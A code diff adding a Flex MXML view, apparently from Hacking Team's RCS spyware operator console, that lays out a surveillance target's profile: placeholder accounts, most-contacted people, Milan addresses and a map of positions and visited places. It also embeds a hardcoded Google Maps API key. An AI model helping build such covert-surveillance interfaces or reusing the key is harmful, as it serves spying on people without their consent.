@@ -1,0 +1,220 @@
+<?xml version="1.0" encoding="utf-8"?>
+<s:BorderContainer xmlns:fx="http://ns.adobe.com/mxml/2009"
+									 xmlns:s="library://ns.adobe.com/flex/spark"
+									 xmlns:mx="library://ns.adobe.com/flex/mx"
+									 xmlns:maps="com.google.maps.*"
+									 height="100%"
+									 width="100%"
+									 borderColor="0xCCCCCC"
+									 backgroundColor="0xFFFFFF"
+									 backgroundAlpha="1"
+									 creationComplete="init()">
+	<fx:Script>
+		<![CDATA[
+			import com.google.maps.LatLng;
+			import com.google.maps.LatLngBounds;
+			import com.google.maps.Map;
+			import com.google.maps.MapEvent;
+			import com.google.maps.MapMouseEvent;
+			import com.google.maps.MapType;
+			import com.google.maps.MapZoomEvent;
+			import com.google.maps.PaneId;
+			import com.google.maps.controls.MapTypeControl;
+			import com.google.maps.controls.PositionControl;
+			import com.google.maps.controls.ZoomControl;
+			import com.google.maps.interfaces.IOverlay;
+			import com.google.maps.interfaces.IPane;
+			import com.google.maps.overlays.GroundOverlay;
+			import com.google.maps.overlays.GroundOverlayOptions;
+			import com.google.maps.overlays.Marker;
+			import com.google.maps.overlays.MarkerOptions;
+
+			import it.ht.rcs.console.operations.view.evidences.advanced.viewers.map.CustomMarker;
+
+			import mx.collections.ArrayCollection;
+
+
+			[Bindable]
+			private var accounts:ArrayCollection;
+
+			[Bindable]
+			private var contacts:ArrayCollection;
+
+			[Bindable]
+			private var locations:ArrayCollection;
+
+			[Embed(source='/img/stub/fakeprofile.jpg')]
+			[Bindable]
+			private var FakeProfile:Class;
+
+			private function init():void
+			{
+				accounts=new ArrayCollection();
+				accounts.addItem({type: "facebook", name: "johndoe69"})
+				accounts.addItem({type: "gmail", name: "johndoe@gmail.com"})
+				accounts.addItem({type: "skype", name: "johndoe"})
+				accounts.addItem({type: "msn", name: "johndoe@hotmail.com"})
+				accounts.addItem({type: "outlook", name: "me@johndoe.com"})
+
+				contacts=new ArrayCollection();
+				contacts.addItem({type: "facebook", name: "johndoe69", perc: "85%"})
+				contacts.addItem({type: "gmail", name: "johndoe@gmail.com", perc: "85%"})
+				contacts.addItem({type: "skype", name: "johndoe", perc: "85%"})
+				contacts.addItem({type: "msn", name: "johndoe@hotmail.com", perc: "85%"})
+				contacts.addItem({type: "outlook", name: "me@johndoe.com", perc: "85%"})
+
+				locations=new ArrayCollection();
+				locations.addItem({label: "Via della Moscova 13, 20100 - Milano"})
+				locations.addItem({label: "Corso di Porta Romana 2, 20100 - Milano"})
+				locations.addItem({label: "Viale Andrea Doria 7, 20100 - Milano"})
+				locations.addItem({label: "Piazza Cavour 1, 20100 - Milano"})
+			}
+
+			private function onMapReady(event:Event):void
+			{
+				map.addControl(new ZoomControl());
+				map.addControl(new PositionControl());
+				map.addControl(new MapTypeControl())
+
+				var coordinates:LatLng=new LatLng(37.771008, -122.41175);
+				var bounds:LatLngBounds=new LatLngBounds();
+				var centre:LatLng=new LatLng(coordinates.lat(), coordinates.lng());
+				map.setCenter(centre, 14, MapType.NORMAL_MAP_TYPE);
+				bounds.extend(coordinates);
+				var marker:Marker=new Marker(coordinates);
+				map.addOverlay(marker);
+				map.setCenter(bounds.getCenter(), map.getBoundsZoomLevel(bounds));
+			}
+		]]>
+	</fx:Script>
+	<s:layout>
+		<s:VerticalLayout paddingBottom="10"
+											paddingLeft="10"
+											paddingRight="10"
+											paddingTop="10"
+											gap="6"/>
+	</s:layout>
+	<s:VGroup width="100%">
+		<s:HGroup width="100%">
+			<s:Label fontFamily="Myriad"
+							 fontSize="20"
+							 fontWeight="bold"
+							 paddingTop="2"
+							 text="John Doe"/>
+			<s:Spacer width="100%"/>
+			<s:HGroup verticalAlign="middle"
+								horizontalAlign="right"
+								width="100%">
+				<s:Label text="Filter data "
+								 fontWeight="bold"/>
+				<s:Label text="from:"
+								 fontWeight="bold"/>
+				<mx:DateField/>
+				<s:Label text="to:"
+								 fontWeight="bold"/>
+				<mx:DateField/>
+			</s:HGroup>
+		</s:HGroup>
+
+		<s:Line width="100%">
+			<s:stroke>
+				<s:SolidColorStroke color="0xCCCCCC"/>
+			</s:stroke>
+		</s:Line>
+	</s:VGroup>
+	<s:Spacer height="14"/>
+	<s:HGroup width="100%"
+						height="100%">
+		<s:VGroup width="40%"
+							height="100%">
+
+			<s:HGroup width="100%">
+				<s:BorderContainer width="200"
+													 height="200"
+													 borderAlpha="1"
+													 borderColor="0x666666"
+													 backgroundColor="0xCCCCCC"
+													 backgroundAlpha="0.3">
+					<s:Image source="{FakeProfile}" x="1" y="1"
+									 width="196"
+									 height="196"
+									 smooth="true"/>
+				</s:BorderContainer>
+				<s:VGroup width="100%">
+					<s:Label text="Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla tincidunt iaculis metus sed elementum. Curabitur et tortor vel sem dignissim ultricies a sit amet sem. Donec a cursus lorem. Curabitur quam purus, imperdiet non luctus et, laoreet eget dui."
+									 width="100%"/>
+				</s:VGroup>
+			</s:HGroup>
+			<s:Spacer height="12"/>
+			<s:Label text="Accounts:"
+							 fontWeight="bold"/>
+			<s:List width="100%"
+							height="100%"
+							itemRenderer="it.ht.rcs.console.entities.view.ContactListRenderer"
+							dataProvider="{accounts}"/>
+			<s:Spacer height="12"/>
+			<s:Label text="Most Contacted:"
+							 fontWeight="bold"/>
+			<s:List width="100%"
+							height="100%"
+							itemRenderer="it.ht.rcs.console.entities.view.ContactListRenderer"
+							dataProvider="{contacts}"/>
+		</s:VGroup>
+		<s:Spacer width="6"/>
+		<s:VGroup width="60%"
+							horizontalAlign="center"
+							height="100%">
+
+			<s:BorderContainer width="100%"
+												 height="100%"
+												 borderAlpha="1"
+												 borderColor="0x666666"
+												 backgroundColor="0xCCCCCC"
+												 backgroundAlpha="0.3">
+				<s:layout>
+					<s:VerticalLayout paddingBottom="10"
+														paddingLeft="10"
+														paddingRight="10"
+														paddingTop="10"
+														gap="6"/>
+				</s:layout>
+				<s:HGroup width="100%"
+									horizontalAlign="left">
+					<s:CheckBox label="Last Positions"/>
+					<s:Spacer width="10"/>
+					<s:CheckBox label="Addresses"/>
+					<s:Spacer width="10"/>
+					<s:CheckBox label="Visited Places"/>
+				</s:HGroup>
+				<s:VGroup paddingBottom="0"
+									paddingTop="0"
+									gap="0"
+									width="100%"
+									height="100%">
+					<s:BorderContainer width="100%"
+														 height="70%"
+														 borderAlpha="1"
+														 borderColor="0x666666"
+														 backgroundColor="0xCCCCCC"
+														 backgroundAlpha="0.3">
+						<maps:Map xmlns:maps="com.google.maps.*"
+											id="map"
+											mapevent_mapready="onMapReady(event)"
+											width="100%"
+											height="100%"
+											key="ABQIAAAA8fmTpYQsyimBWFWKgeE9PBRhMg83CBLwD9y4vh6Mu8HzQS3H_RRayLm54B1SF17x6N9sYwYVwJV_FQ"
+											url="http://www.hackingteam.it/"
+											sensor="false"
+											accessibilityDescription=""/>
+					</s:BorderContainer>
+					<s:Spacer height="6"/>
+					<s:List width="100%"
+									height="30%"
+									dataProvider="{locations}"
+									itemRenderer="it.ht.rcs.console.entities.view.AddressListRenderer"/>
+				</s:VGroup>
+			</s:BorderContainer>
+
+		</s:VGroup>
+	</s:HGroup>
+</s:BorderContainer>
